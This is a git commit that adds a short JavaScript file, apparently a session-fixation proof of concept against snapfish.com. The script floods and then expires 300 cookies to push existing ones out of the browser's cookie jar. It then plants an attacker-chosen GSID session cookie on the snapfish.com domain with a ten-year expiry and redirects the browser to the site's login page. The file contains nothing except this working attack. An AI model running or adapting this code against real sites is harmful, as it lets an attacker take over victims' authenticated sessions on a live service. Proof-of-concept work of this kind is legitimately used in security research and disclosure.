4cb4b74e57878525e4b92230747de6a46783c5fe
Márcio Cirqueira <62367006+mrccrqr@users.noreply.github.com>
2025-02-13 16:31:53 -0300

    Create a.js

---
+++ a.js
@@ -0,0 +1,14 @@
+cookiejar_size = 300;
+
+for (let i = 0; i < cookiejar_size; i++) 
+    document.cookie = `cookie${i}=a; Secure; path=/`;
+
+for (let i = 0; i < cookiejar_size; i++) 
+    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;
+
+const expires = new Date();
+expires.setFullYear(expires.getFullYear() + 10);
+
+document.cookie = `GSID=aus-27e95bb9-7d53-4fb5-92c4-3e5646cc8f53-31160; Domain=snapfish.com; Path=/; Expires=${expires.toUTCString()}`;
+
+window.location.href = "https://www.snapfish.com/loginto";
